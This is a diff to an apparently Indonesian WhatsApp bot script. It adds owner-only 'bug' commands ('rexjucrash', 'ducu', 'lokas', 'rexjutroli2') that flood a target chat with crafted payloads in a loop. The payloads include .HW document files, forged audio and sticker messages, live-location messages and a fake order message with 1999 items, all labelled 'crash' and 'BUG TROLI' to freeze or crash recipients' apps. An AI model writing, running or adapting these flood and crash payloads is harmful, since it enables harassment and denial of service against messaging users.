@@ -74,7 +74,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
 
         //group\\
         const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
-        const groupName = m.isGroup ? groupMetadata.subject : ''
+      ///////////////  const groupName = m.isGroup ? groupMetadata.subject : ''
         const participants = m.isGroup ? await groupMetadata.participants : ''
         const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
         const groupOwner = m.isGroup ? groupMetadata.owner : ''
@@ -259,22 +259,7 @@ message: {
 }
 }
 //FAKEREPLY GROUPINVITE
-const fgclink = {
-"key": {
-"fromMe": false,
-"participant": "0@s.whatsapp.net",
-"remoteJid": "0@s.whatsapp.net"
-},
-"message": {
-"groupInviteMessage": {
-"groupJid": "916909137213-1616169743@g.us",
-"inviteCode": `${global.ownername}`,
-"groupName": `${global.botname}`, 
-"caption":`${global.watermark}`, 
-'jpegThumbnail': log0
-}
-}
-}
+
 //FAKEREPLY GIF
 const fgif = {
 key: { 
@@ -646,13 +631,117 @@ XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
   }
 	}
 	
-if (AntiNsfw2)
+/////if (AntiNsfw2)
 switch(command) {
 	case 'test3': {
 		if (!isCreator) return
 		reply(`Ken *nyala*`)
 		}
 		break
+		case 'ducu': case 'rexjuducu': {
+
+		if (!isCreator) return
+
+		
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+		
+jumlah = `${encodeURI(q)}`
+
+		ydd = `Hallo Aku haikal`
+
+		for (let i = 0; i < jumlah; i++) {
+
+		yy = fs.readFileSync('./lib/hwmods.HW')
+		
+XeonBotInc.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© °rexju°APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
+
+		}
+
+		}
+		break
+	case 'rexjubug1': case 'rexjucrash': case 'crashar10':{
+if (!isCreator) return
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"audioMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
+"mimetype": "audio/mpeg",
+"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
+"fileLength": "258330",
+"seconds": 16,
+"ptt": false,
+"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
+"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
+"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
+"mediaKeyTimestamp": "1657190832",
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
+}
+}
+		break
+	case '⚔️': case '🗡️': case '🛡️': case '🪞': case '🔧': {
+if (!isCreator) return
+await XeonBotInc.sendMessage(m.chat, { 
+text: '', 
+templateButtons: [
+{ callButton: { displayText: `OWNER`, phoneNumber: `6285714170944`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6283186308195`}},
+{ urlButton: { displayText: `GROUP HW MODS WA`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
+{ quickReplyButton: { displayText: `MY`, id: `Anjay Menger`}},
+{ quickReplyButton: { displayText: `NAME`, id: `AH SLEBEEW`}},
+{ quickReplyButton: { displayText: `HAIKAL`, id: `JAGOAN OM?`}},
+]
+ })
+  await sleep(10000)
+ }
+ break
+case 'rexjubug6': case 'rexjucrash5': case 'crashar15':{
+if (!isCreator) return
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false,
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+}
+}
+break
+case 'lokas': case 'rexjulokas': {
+if (!isCreator) return
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"liveLocationMessage": {
+"degreesLatitude": -6.9367014,
+"degreesLongitude": 107.7228574,
+"caption": `© © °rexju°͢${ngazap(prefix)}`,
+"sequenceNumber": "1657237469254001",
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
+}
+}
+ break
         	case 'bugmenu': case 'buglist': {
         	if (!isPremium && !isCreator) return reply(mess.premi)
         reply(`testing`)
@@ -790,6 +879,30 @@ sourceUrl: `https://wa.me/62882021734861`,
 thumbnailUrl: 'https://i.ibb.co/T1jCqF4/IMG-20221024-WA0002.jpg', 
 }
 }}}}}, { quoted:doc})
+}
+}
+break
+case 'rexjutroli2': case 'rexjutrol': case 'jutrol': {
+if (!isCreator) return
+if (args.length == 0) return reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+a = await XeonBotInc.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"orderMessage": {
+"orderId": "599519108102353",
+"thumbnail": thumb,
+"itemCount": 1999,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": " BY © °rexju°",
+"orderTitle": " BUG TROLI ", // 
+"sellerJid": "6283186308195@s.whatsapp.net",
+"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 }
 break
